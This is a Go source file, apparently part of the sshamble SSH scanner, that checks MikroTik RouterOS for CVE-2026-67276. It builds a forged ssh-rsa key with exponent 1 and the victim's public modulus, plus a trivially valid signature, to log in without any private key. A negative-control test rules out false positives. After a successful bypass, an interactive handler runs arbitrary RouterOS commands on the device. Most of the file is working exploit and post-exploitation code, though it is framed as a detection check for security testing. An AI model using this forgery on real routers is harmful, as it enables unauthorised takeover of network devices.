package cmd

import (
	"bufio"
	"bytes"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/hex"
	"fmt"
	"hash"
	"io"
	"math/big"
	"net"
	"os"
	"strings"
	"time"

	"github.com/runZeroInc/excrypto/crypto/rsa"
	"github.com/runZeroInc/excrypto/x/crypto/ssh"
	"github.com/runZeroInc/sshamble/auth"
)

const checkVulnMikrotikPubkey = "vuln-mikrotik-pubkey-bypass"

// CVE-2026-67276 (MikroTrick): RouterOS SSH userauth matches a presented
// public-key blob against the user's authorized key by (key type, modulus) and
// omits the exponent, then verifies the signature using the exponent from the
// client-supplied blob. Presenting {ssh-rsa, e=1, n=victim modulus} makes
// sig^1 mod n == sig, so the valid "signature" is simply the EMSA-PKCS1-v1_5
// block of the auth data, computable by anyone who knows the victim's public
// modulus. No private key is required.
//
// https://cert.pl/en/posts/2026/09/vulnerabilities-in-mikrotik-routeros-actively-exploited/

// ASN.1 DigestInfo prefixes for the EMSA-PKCS1-v1_5 encoding of each RSA
// signature algorithm (RFC 8017 section 9.2 note 1).
var mikrotikDigestInfo = map[string][]byte{
	ssh.KeyAlgoRSA:       mikrotikMustHex("3021300906052b0e03021a05000414"),
	ssh.KeyAlgoRSASHA256: mikrotikMustHex("3031300d060960864801650304020105000420"),
	ssh.KeyAlgoRSASHA512: mikrotikMustHex("3051300d060960864801650304020305000440"),
}

func mikrotikMustHex(s string) []byte {
	b, err := hex.DecodeString(s)
	if err != nil {
		panic(err)
	}
	return b
}

// mikrotikForgeSigner presents a forged {ssh-rsa, e=1, n} public key and, when
// asked to sign, returns the raw EMSA-PKCS1-v1_5 block of the auth data. That
// block is a valid signature iff the server verifies with the client-supplied
// e=1 exponent (the CVE-2026-67276 defect).
type mikrotikForgeSigner struct {
	pub ssh.PublicKey
	n   *big.Int
}

func (s *mikrotikForgeSigner) PublicKey() ssh.PublicKey { return s.pub }

func (s *mikrotikForgeSigner) Sign(rand io.Reader, data []byte) (*ssh.Signature, error) {
	return s.SignWithAlgorithm(rand, data, ssh.KeyAlgoRSA)
}

func (s *mikrotikForgeSigner) SignWithAlgorithm(rand io.Reader, data []byte, algorithm string) (*ssh.Signature, error) {
	k := (s.n.BitLen() + 7) / 8
	block, err := mikrotikEmsaPKCS1v15(data, algorithm, k)
	if err != nil {
		return nil, err
	}
	// Encode the signature integer as a minimal mpint: strip the leading zero
	// byte (the EMSA block always begins 0x00 0x01) so the value is unchanged.
	sig := bytes.TrimLeft(block, "\x00")
	if len(sig) == 0 {
		sig = []byte{0}
	}
	return &ssh.Signature{Format: algorithm, Blob: sig}, nil
}

// mikrotikEmsaPKCS1v15 builds the RFC 8017 section 9.2 EMSA-PKCS1-v1_5 block
// of length k for the given SSH RSA signature algorithm.
func mikrotikEmsaPKCS1v15(data []byte, sigAlg string, k int) ([]byte, error) {
	di, ok := mikrotikDigestInfo[sigAlg]
	if !ok {
		return nil, fmt.Errorf("unsupported RSA signature algorithm %q", sigAlg)
	}

	var h hash.Hash
	switch sigAlg {
	case ssh.KeyAlgoRSA:
		h = sha1.New()
	case ssh.KeyAlgoRSASHA256:
		h = sha256.New()
	case ssh.KeyAlgoRSASHA512:
		h = sha512.New()
	}
	h.Write(data)

	t := append(append([]byte{}, di...), h.Sum(nil)...)
	psLen := k - len(t) - 3
	if psLen < 8 {
		return nil, fmt.Errorf("RSA modulus too small for %s (%d bytes)", sigAlg, k)
	}

	out := make([]byte, 0, k)
	out = append(out, 0x00, 0x01)
	out = append(out, bytes.Repeat([]byte{0xff}, psLen)...)
	out = append(out, 0x00)
	out = append(out, t...)
	return out, nil
}

func sshCheckVulnMikrotikPubkey(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnMikrotikPubkey
	if !conf.IsCheckEnabled(tname) {
		return nil
	}

	// Victim modulus comes from --mikrotik-pubkey, or from an ssh-rsa --private-key.
	modulus := conf.MikrotikRSAModulus
	if modulus == nil && options.PrivateKey != nil {
		modulus = rsaModulusFromPubkey(options.PrivateKey.PublicKey())
	}
	if modulus == nil {
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	// Build the forged {ssh-rsa, e=1, n=victim} public key.
	pub, err := ssh.NewPublicKey(&rsa.PublicKey{N: modulus, E: big.NewInt(1)})
	if err != nil {
		conf.Logger.Errorf("%s %s failed to build forged key: %v", addr, tname, err)
		return nil
	}

	signer := &mikrotikForgeSigner{pub: pub, n: modulus}

	am := ssh.AuthMethod(ssh.PublicKeysCallback(func() ([]ssh.Signer, error) {
		return []ssh.Signer{signer}, nil
	}))

	cb := func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
		_ = c.SetDeadline(time.Now().Add(time.Second * 15))
		out, err := ses.CombinedOutput("/system resource print")
		r.SessionOutput = auth.CleanSessionOutput([]byte(out))
		r.ExitStatus = ""
		if err != nil {
			if ee, ok := err.(*ssh.ExitError); ok {
				r.ExitStatus = fmt.Sprintf("%d", ee.ExitStatus())
				return nil
			}
			return err
		}
		return nil
	}

	res := auth.SSHAuth(addr, options.WithSessionHandler(cb), auth.SSHAuthHandlerSingle(am))

	if res.Stage != "session" {
		conf.Logger.Debugf("%s %s did not bypass auth (stage %s): %v", addr, tname, res.Stage, res.Error)
		return nil
	}

	// Negative control: a forged key with a DIFFERENT modulus must be rejected.
	// If it also authenticates, the server accepts arbitrary keys (not this CVE)
	// and we must not report a vulnerability.
	if mikrotikNegativeControlAuthenticated(addr, conf, options, modulus) {
		conf.Logger.Warnf("%s %s negative control (wrong modulus) also authenticated; not reporting CVE-2026-67276", addr, tname)
		return nil
	}

	conf.Logger.Warnf("%s %s bypassed authentication as %s using a forged e=1 public key", addr, tname, options.Username)
	conf.Logger.Infof("%s %s Mikrotik version output: %s", addr, tname, res.SessionOutput)

	root.AddVuln(auth.VulnResult{
		ID:    tname,
		Ref:   "https://cert.pl/en/posts/2026/09/vulnerabilities-in-mikrotik-routeros-actively-exploited/",
		Proof: fmt.Sprintf("CVE-2026-67276: authenticated as %s via forged e=1 RSA public key (modulus-only). /system resource print: %s", options.Username, res.SessionOutput),
	})

	res.SessionMethod = tname
	root.SessionMethod = tname
	root.SessionOutput = res.SessionOutput
	root.SessionSecret = auth.PubKeyToString(pub)
	root.ExitStatus = res.ExitStatus
	root.SessionAuth = am

	return res
}

// mikrotikNegativeControlAuthenticated attempts the same forge using an
// unrelated modulus. A vulnerable RouterOS matches by modulus and will reject
// this key; a server that accepts it is accepting arbitrary keys for some other
// reason, which is not CVE-2026-67276.
func mikrotikNegativeControlAuthenticated(addr string, conf *ScanConfig, options *auth.Options, victimModulus *big.Int) bool {
	// A fixed unrelated 2048-bit modulus (RFC 2409 group 2 prime).
	wrongN, ok := new(big.Int).SetString("ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff", 16)
	if !ok {
		conf.Logger.Warnf("%s mikrotik negative control failed to parse modulus", addr)
		return false
	}

	pub, err := ssh.NewPublicKey(&rsa.PublicKey{N: wrongN, E: big.NewInt(1)})
	if err != nil {
		conf.Logger.Warnf("%s mikrotik negative control failed to build key: %v", addr, err)
		return false
	}
	signer := &mikrotikForgeSigner{pub: pub, n: wrongN}
	am := ssh.AuthMethod(ssh.PublicKeysCallback(func() ([]ssh.Signer, error) {
		return []ssh.Signer{signer}, nil
	}))

	ctrl := auth.SSHAuth(addr, options.WithStopStage("session"), auth.SSHAuthHandlerSingle(am))
	return ctrl.Stage == "session"
}

// MikrotikInteractHandler drives an interactive RouterOS command session over
// exec channels. RouterOS's SSH "shell" channel is a full-screen TUI that
// requires terminal emulation (it emits ESC[6n cursor-position queries and
// draws a banner), so the generic raw-mode interact handler cannot send it
// input. RouterOS's "exec" channel, however, runs commands reliably, so we
// implement a line-based REPL that opens a fresh exec session per command.
func (conf *ScanConfig) MikrotikInteractHandler(addr string, options *auth.Options, root *auth.AuthResult) auth.SessionHandler {
	return func(conn net.Conn, sclient *ssh.Client, ses *ssh.Session, res *auth.AuthResult) error {
		// The auto-opened session is unused; close it and drive our own
		// exec sessions instead.
		_ = ses.Close()
		_ = conn.SetDeadline(time.Time{})

		defer sclient.Close()

		reader := bufio.NewReader(os.Stdin)
		fmt.Printf("\r\nMikroTik RouterOS exec session on %s (user %s)\r\n", addr, options.Username)
		fmt.Printf("Type RouterOS commands, or 'exit' to quit.\r\n\r\n")

		for {
			fmt.Printf("[%s@%s] > ", options.Username, addr)
			line, err := reader.ReadString('\n')
			if err != nil {
				if err == io.EOF {
					return nil
				}
				return err
			}
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			switch strings.ToLower(line) {
			case "exit", "quit", ".":
				return nil
			}

			cs, err := sclient.NewSession()
			if err != nil {
				fmt.Fprintf(os.Stderr, "failed to open exec session: %v\r\n", err)
				return err
			}
			out, cerr := cs.CombinedOutput(line)
			cs.Close()
			if len(out) > 0 {
				os.Stdout.Write(out)
				if out[len(out)-1] != '\n' {
					os.Stdout.Write([]byte("\r\n"))
				}
			}
			if cerr != nil {
				if cerr == io.EOF {
					return nil
				}
				if _, ok := cerr.(*ssh.ExitError); !ok {
					fmt.Fprintf(os.Stderr, "command failed: %v\r\n", cerr)
				}
			}
		}
	}
}

// rsaModulusFromPubkey returns the RSA modulus of an ssh-rsa public key, or nil.
func rsaModulusFromPubkey(pub ssh.PublicKey) *big.Int {
	if pub == nil || pub.Type() != ssh.KeyAlgoRSA {
		return nil
	}
	cpk, ok := pub.(ssh.CryptoPublicKey)
	if !ok {
		return nil
	}
	rpub, ok := cpk.CryptoPublicKey().(*rsa.PublicKey)
	if !ok {
		return nil
	}
	return rpub.N
}

// loadMikrotikModulus parses the victim RSA public key supplied via
// --mikrotik-pubkey and returns its modulus.
func loadMikrotikModulus(conf *ScanConfig) *big.Int {
	if gMikrotikPubKeyFile == "" {
		return nil
	}
	rawb, err := os.ReadFile(gMikrotikPubKeyFile)
	if err != nil {
		conf.Logger.Fatalf("failed to open mikrotik public key file '%s': %v", gMikrotikPubKeyFile, err)
	}
	pub, _, _, _, err := ssh.ParseAuthorizedKey(rawb)
	if err != nil {
		conf.Logger.Fatalf("failed to parse mikrotik public key '%s': %v", gMikrotikPubKeyFile, err)
	}
	if pub.Type() != ssh.KeyAlgoRSA {
		conf.Logger.Fatalf("mikrotik public key '%s' is %q, need ssh-rsa", gMikrotikPubKeyFile, pub.Type())
	}
	return rsaModulusFromPubkey(pub)
}
